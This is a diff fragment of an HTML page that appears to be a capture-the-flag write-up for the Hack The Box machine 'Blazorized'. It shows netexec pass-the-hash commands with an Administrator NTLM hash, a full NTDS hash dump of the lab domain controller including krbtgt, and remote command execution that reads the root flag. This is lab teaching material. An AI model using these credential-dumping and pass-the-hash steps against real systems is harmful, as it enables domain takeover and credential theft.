+</span><span id="__span-20-30"><a id="__codelineno-20-30" name="__codelineno-20-30" href="#__codelineno-20-30"></a>  Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3
+</span><span id="__span-20-31"><a id="__codelineno-20-31" name="__codelineno-20-31" href="#__codelineno-20-31"></a>&lt;--SNIP--&gt;
+</span></code></pre></div>
+<p>We proceed with a pass-the-hash attack and dump the NTDS domain database using <code>Netexec</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>$ nxc smb dc1.blazorized.htb -u Administrator -H f55ed1465179ba374ec1cad05b34a5f3
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>SMB         10.129.231.74   445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>SMB         10.129.231.74   445    DC1              [+] blazorized.htb\Administrator:f55ed1465179ba374ec1cad05b34a5f3 (Pwn3d!)
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>┌──(kali㉿kali)-[~/htb/blazorized]
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>└─$ nxc smb dc1.blazorized.htb -u Administrator -H f55ed1465179ba374ec1cad05b34a5f3 --ntds
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user &lt;user&gt; to dump a specific user safely or the module -M ntdsutil [Y/n] 
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>SMB         10.129.231.74   445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>SMB         10.129.231.74   445    DC1              [+] blazorized.htb\Administrator:f55ed1465179ba374ec1cad05b34a5f3 (Pwn3d!)
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>SMB         10.129.231.74   445    DC1              [+] Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>SMB         10.129.231.74   445    DC1              Administrator:500:aad3b435b51404eeaad3b435b51404ee:f55ed1465179ba374ec1cad05b34a5f3:::
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>SMB         10.129.231.74   445    DC1              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>SMB         10.129.231.74   445    DC1              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a001ebf25825cadb6b423a2d28378467:::
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\RSA_4810:1107:aad3b435b51404eeaad3b435b51404ee:381b793bde4dea233ae34bb1d9ce38f5:::
+</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\NU_1056:1109:aad3b435b51404eeaad3b435b51404ee:abe496a00e60878932c084c9db511f94:::
+</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\NU_1057:1110:aad3b435b51404eeaad3b435b51404ee:59e98e58c973a5cb2b125a17ff91b6a8:::
+</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\NU_1058:1111:aad3b435b51404eeaad3b435b51404ee:6ac2dfc65463962ed19b653b409046ba:::
+</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\NU_1055:1117:aad3b435b51404eeaad3b435b51404ee:63001e8b2d13ee358ad7d6de4590fed3:::
+</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\RSA_4811:1118:aad3b435b51404eeaad3b435b51404ee:4368391035803bf58273e1273692285b:::
+</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\RSA_4812:1120:aad3b435b51404eeaad3b435b51404ee:c66e4531c81de604e3531018fdad81cb:::
+</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\RSA_4813:1121:aad3b435b51404eeaad3b435b51404ee:2c84dfeb21e075dc5fc2c56447bdf9d6:::
+</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\RSA_4814:1122:aad3b435b51404eeaad3b435b51404ee:e7ddd56fabdb8fb1ebe6c43ff5fe815a:::
+</span><span id="__span-21-23"><a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\SSA_6010:1124:aad3b435b51404eeaad3b435b51404ee:798d0354e026fd168b91063f09184c9f:::
+</span><span id="__span-21-24"><a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\SSA_6011:1125:aad3b435b51404eeaad3b435b51404ee:be1ce1381c084dc4cda8159a665b3c59:::
+</span><span id="__span-21-25"><a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\SSA_6012:1126:aad3b435b51404eeaad3b435b51404ee:08db7bd0f2482f4e4cb0b1f6864f88e1:::
+</span><span id="__span-21-26"><a id="__codelineno-21-26" name="__codelineno-21-26" href="#__codelineno-21-26"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\SSA_6013:1127:aad3b435b51404eeaad3b435b51404ee:ef37b4e655b62e664b6f9ae67133f2e6:::
+</span><span id="__span-21-27"><a id="__codelineno-21-27" name="__codelineno-21-27" href="#__codelineno-21-27"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\LSA_3211:1128:aad3b435b51404eeaad3b435b51404ee:7c8fed15e80ed63db789ad740cda2f18:::
+</span><span id="__span-21-28"><a id="__codelineno-21-28" name="__codelineno-21-28" href="#__codelineno-21-28"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\LSA_3212:1129:aad3b435b51404eeaad3b435b51404ee:72bab07816477b4aeffca4f709efbaa5:::
+</span><span id="__span-21-29"><a id="__codelineno-21-29" name="__codelineno-21-29" href="#__codelineno-21-29"></a>SMB         10.129.231.74   445    DC1              blazorized.htb\LSA_3213:1131:aad3b435b51404eeaad3b435b51404ee:e80b666e0ee68cd0a6516a92e75231cc:::
+</span><span id="__span-21-30"><a id="__codelineno-21-30" name="__codelineno-21-30" href="#__codelineno-21-30"></a>SMB         10.129.231.74   445    DC1              DC1$:1002:aad3b435b51404eeaad3b435b51404ee:4b4ed5dfaa22dc4e41c279c0c62b9ee2:::
+</span><span id="__span-21-31"><a id="__codelineno-21-31" name="__codelineno-21-31" href="#__codelineno-21-31"></a>SMB         10.129.231.74   445    DC1              [+] Dumped 20 NTDS hashes to /home/kali/.nxc/logs/DC1_10.129.231.74_2025-01-18_031048.ntds of which 19 were added to the database
+</span><span id="__span-21-32"><a id="__codelineno-21-32" name="__codelineno-21-32" href="#__codelineno-21-32"></a>SMB         10.129.231.74   445    DC1              [*] To extract only enabled accounts from the output file, run the following command: 
+</span><span id="__span-21-33"><a id="__codelineno-21-33" name="__codelineno-21-33" href="#__codelineno-21-33"></a>SMB         10.129.231.74   445    DC1              [*] cat /home/kali/.nxc/logs/DC1_10.129.231.74_2025-01-18_031048.ntds | grep -iv disabled | cut -d &#39;:&#39; -f1
+</span><span id="__span-21-34"><a id="__codelineno-21-34" name="__codelineno-21-34" href="#__codelineno-21-34"></a>SMB         10.129.231.74   445    DC1              [*] grep -iv disabled /home/kali/.nxc/logs/DC1_10.129.231.74_2025-01-18_031048.ntds | cut -d &#39;:&#39; -f1
+</span></code></pre></div>
+<p>The root flag can now be obtained at <code>C:\Users\Administrator\Desktop\root.txt</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>$ nxc smb dc1.blazorized.htb -u Administrator -H f55ed1465179ba374ec1cad05b34a5f3 -x &quot;type C:\Users\Administrator\Desktop\root.txt&quot;
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>SMB         10.129.231.74   445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>SMB         10.129.231.74   445    DC1              [+] blazorized.htb\Administrator:f55ed1465179ba374ec1cad05b34a5f3 (Pwn3d!)
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>SMB         10.129.231.74   445    DC1              [+] Executed command via wmiexec
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>SMB         10.129.231.74   445    DC1              48b522165eef12c73c34205c205de8ac
+</span></code></pre></div>
 
 
 
@@ -1021,7 +1907,7 @@ var encryptcontent_obfuscate = 0;
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../Axlle/" class="md-footer__link md-footer__link--prev" aria-label="Previous: [Protected] Axlle">
+          <a href="../Axlle/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Axlle">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
@@ -1031,7 +1917,7 @@ var encryptcontent_obfuscate = 0;
                 Previous
               </span>
               <div class="md-ellipsis">
-                [Protected] Axlle
+                Axlle
               </div>
             </div>
           </a>
